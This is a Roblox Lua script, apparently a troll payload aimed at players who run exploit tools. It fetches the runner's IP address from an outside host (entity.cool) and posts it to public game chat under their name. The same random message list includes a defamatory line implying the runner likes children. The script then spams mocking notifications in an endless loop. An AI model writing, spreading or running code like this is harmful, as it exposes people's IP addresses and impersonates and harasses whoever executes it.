local msgs = {
    'my ip is ' .. game:HttpGet('https://entity.cool/whitelist/getip'),
    'jjsploit winning',
    'why my jjexploit is crash',
    'pls robux',
    'i like kids',
    'synapse is bad, jjsploit winning'
}
game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msgs[math.random(1, #msgs)], "ALL")

while true do
local StarterGui = game:GetService("StarterGui") 
local bindable = Instance.new("BindableFunction")

function bindable.OnInvoke(response)
    print(response .. " LOOOOL")
end

StarterGui:SetCore("SendNotification", {
	Title = "Sucks to be you",
	Text = "So why are you here",
	Duration = 5,
	Callback = bindable,
	Button1 = "just want it free",
	Button2 = "skid"
})
wait()
end
